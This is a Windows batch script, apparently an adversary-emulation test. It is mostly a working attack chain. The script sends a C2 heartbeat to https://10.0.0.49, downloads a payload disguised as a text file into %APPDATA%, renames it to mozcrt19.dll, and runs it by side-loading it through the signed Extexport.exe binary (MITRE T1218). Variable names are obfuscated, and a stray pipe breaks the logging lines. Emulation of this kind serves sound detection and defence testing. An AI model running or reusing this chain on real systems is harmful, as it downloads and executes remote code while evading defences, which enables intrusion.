@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET douyiw=%APPDATA%\8819\621c4648
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?8819-10
SET eykalkg=BALAM-S2B
SET fkesh=10
SET ecrfwq=goog1edrive.txt
SET rgnpbq=8819

REM Calculated variables with random names
SET ztpydo=%APPDATA%\!fkesh!
SET awrxsd=!ztpydo!\macula-simulations.log
SET udhdp=!ztpydo!
SET vbnfyx=Extexport.exe
SET tlrkm=0
SET mjgcq=

REM Normalize timestamp format
FOR /F "tokens=2-4 delims=/ " %%a IN ("%DATE%") DO SET ygrb=%%c-%%a-%%b
SET hzmgv=%TIME%
SET zybnl=!ygrb! !hzmgv!

REM 1. C2 HEARTBEAT
echo [!zybnl!][DEBUG][!eykalkg!]: heartbeat_start=!frytcn!>> "!awrxsd!" 2>nul
curl -k -s -o nul "!frytcn!"
IF NOT !ERRORLEVEL! EQU 0 (
    SET tlrkm=1
    SET mjgcq=connection_failed
)
echo [!zybnl!][DEBUG][!eykalkg!]: heartbeat_end=!ERRORLEVEL!>> "!awrxsd!" 2>nul

REM TTP logging for heartbeat (not a MITRE technique, just debug)
SET tsjnl=!ygrb! !hzmgv!
echo [!tsjnl!][!eykalkg!]: !fkesh!-!rgnpbq!-T1218|Signed_Binary_Proxy_Execution=!tlrkm!:!mjgcq!>> "!awrxsd!" 2>nul

REM 2. Directory creation
SET zybnl=!ygrb! !hzmgv!
echo [!zybnl!][DEBUG][!eykalkg!]: mkdir_start=!douyiw!>> "!awrxsd!" 2>nul
IF NOT EXIST "!douyiw!" MD "!douyiw!"
echo [!zybnl!][DEBUG][!eykalkg!]: mkdir_end=!ERRORLEVEL!>> "!awrxsd!" 2>nul

REM 3. File download
SET zybnl=!ygrb! !hzmgv!
SET qtqpa=!douyiw!\!ecrfwq!
echo [!zybnl!][DEBUG][!eykalkg!]: download_start=!ovbdjs!>> "!awrxsd!" 2>nul
curl -k -s -o "!qtqpa!" "!ovbdjs!"
SET bjcmz=!ERRORLEVEL!
echo [!zybnl!][DEBUG][!eykalkg!]: download_end=!bjcmz!>> "!awrxsd!" 2>nul
IF NOT !bjcmz! EQU 0 (
    SET tlrkm=0
    SET mjgcq=download_failed
    GOTO LOG_TTP
)

REM 4. File rename
SET zybnl=!ygrb! !hzmgv!
SET mlpsz=!douyiw!\mozcrt19.dll
echo [!zybnl!][DEBUG][!eykalkg!]: rename_start=!qtqpa!>> "!awrxsd!" 2>nul
MOVE /Y "!qtqpa!" "!mlpsz!" >nul
SET pzxuw=!ERRORLEVEL!
echo [!zybnl!][DEBUG][!eykalkg!]: rename_end=!pzxuw!>> "!awrxsd!" 2>nul
IF NOT !pzxuw! EQU 0 (
    SET tlrkm=0
    SET mjgcq=rename_failed
    GOTO LOG_TTP
)

REM 5. DLL execution
SET zybnl=!ygrb! !hzmgv!
SET kfjlg=!douyiw!
echo [!zybnl!][DEBUG][!eykalkg!]: dll_load_start=!vbnfyx!>> "!awrxsd!" 2>nul
START /B /D "!kfjlg!" !vbnfyx! !douyiw! foo bar
SET qmpbt=!ERRORLEVEL!
echo [!zybnl!][DEBUG][!eykalkg!]: dll_load_end=!qmpbt!>> "!awrxsd!" 2>nul
IF NOT !qmpbt! EQU 0 (
    SET tlrkm=0
    SET mjgcq=execution_failed
    GOTO LOG_TTP
)
SET tlrkm=1
SET mjgcq=

:LOG_TTP
SET zybnl=!ygrb! !hzmgv!
echo [!zybnl!][!eykalkg!]: !fkesh!-!rgnpbq!-T1218|Signed_Binary_Proxy_Execution=!tlrkm!:!mjgcq!>> "!awrxsd!" 2>nul